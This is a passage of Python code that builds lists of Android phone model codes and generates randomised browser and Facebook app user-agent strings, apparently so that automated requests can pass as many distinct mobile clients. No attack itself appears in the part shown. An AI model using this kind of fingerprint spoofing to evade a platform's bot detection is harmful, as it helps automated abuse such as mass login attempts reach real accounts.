   realme =  ["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020","RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921"]
   infinix = ["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"]
   samsung = ["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ","G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B","S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"]
   gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']  
   strvoppo = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvredmi = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvoppo1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(oppo))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvinfinix = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; Infinix {str(rc(infinix))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
   strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(1,11))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(10,107))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
   strvnokiax = f"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 NokiaBrowser/7.{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
   strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
   ugen.append(strvoppo)
   ugen.append(strvredmi)
   ugen.append(strvoppo1)
   ugen.append(strvinfinix)
   ugen.append(strvsamsung)
   ugen.append(strvredmi1)
   ugen.append(strvnokiax)
   ugen.append(strvgt)
for op in range(1000):
    rr = random.randint
    rc = random.choice
    bahasa = random.choice(["en","fr","ru","tr","id","pt","es","en-GB"])
    ua1 = f"Opera/9.80 (BlackBerry; Opera Mini/8.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua2 = f"SAMSUNG-GT-S3802 Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua3 = f"Opera/9.80 (iPhone; Opera Mini/16.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua4 = f"Opera/9.80 (Android; Opera Mini/11.0.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ua5 = f"Opera/9.80 (Windows Mobile; Opera Mini/5.1.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; {bahasa}) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
    ugen.append(ua1)
    ugen.append(ua2)
    ugen.append(ua3)
    ugen.append(ua4)
    ugen.append(ua5)
for generate in range(100):
    a=random.randrange(1, 9)
    b=random.randrange(1, 9)
    c=random.randrange(7, 13)
    c=random.randrange(73,100)
    d=random.randrange(4200,4900)
    e=random.randrange(40,150)
    uaku=f'Mozilla/5.0 (Linux; Android {a}.{b}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
    ugen.append(uaku)

def sawg():
    model = random.choice([
        'Redmi 2', 'Redmi 3', 'Redmi 4',
        'Redmi 5', 'Redmi 6', 'Redmi 7', 'Redmi 8'
    ])
    fbav = f"{random.randint(10, 100)}.0.0.{random.randint(4000, 5000)}"
    fbbv = str(random.randint(4000000, 5000000))
    ua = (
        f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
        f"FBDM/{{density=2.75,width=1080,height=2168}};"
        f"FBLC/en_US;FBRV/441815108;FBCR/MTS RUS;"
        f"FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;"
        f"FBDV/{model};FBSV/5.1.1;FBOP/1;FBCA/arm64-v8a;]"
    )
    return ua

def sex_ua():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(['en_GB'])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(['Vodafone', 'Null', 'Teletalk', 'AT&amp-T', 'Skitto', 'Zong', 'Banglalink', 'null', 'Robi', 'MTS RUS', 'Airtel', 'Marshmallow', 'Grameenphone'])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    ___ERROR_ON_FIRE___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    return ___ERROR_ON_FIRE___

def sex_uaa():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(111111111, 999999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(['en_GB'])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(['Vodafone', 'Null', 'Teletalk', 'AT&amp-T', 'Skitto', 'Zong', 'Banglalink', 'null', 'Robi', 'MTS RUS', 'Airtel', 'Marshmallow', 'Grameenphone'])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    agent3 = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    iphone3 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/168.0.0.57.90;FBBV/103647182;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/NOS;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/0]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/485.0.0.50.105;FBBV/650374106;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5;FBRV/652879078;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 [FBAN/FBIOS;FBAV/158.0.0.44.98;FBBV/90997758;FBDV/iPhone8,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/3;FBCR/vodafoneP;FBID/phone;FBLC/en_US;FBOP/5;FBRV/90997758]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21G93 [FBAN/FBIOS;FBAV/493.0.0.55.216;FBBV/672970693;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.6.1;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/674179525;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D72 [FBAN/FBIOS;FBAV/501.0.0.49.107;FBBV/699723644;FBDV/iPhone15,4;FBMD/iPhone;FBSN/iOS;FBSV/18.3.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/701797973;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H350 [FBAN/FBIOS;FBAV/500.0.0.52.98;FBBV/696635672;FBDV/iPhone10,4;FBMD/iPhone;FBSN/iOS;FBSV/16.7.10;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/700448384;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22D82 [FBAN/FBIOS;FBAV/504.0.0.62.85;FBBV/707243085;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/18.3.2;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/0;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20F75 [FBAN/FBIOS;FBAV/503.0.0.56.104;FBBV/704769221;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/16.5.1;FBSS/2;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/708017881;IABMV/1]', 'Mozilla/5.0 (iPhone; CPU iPhone 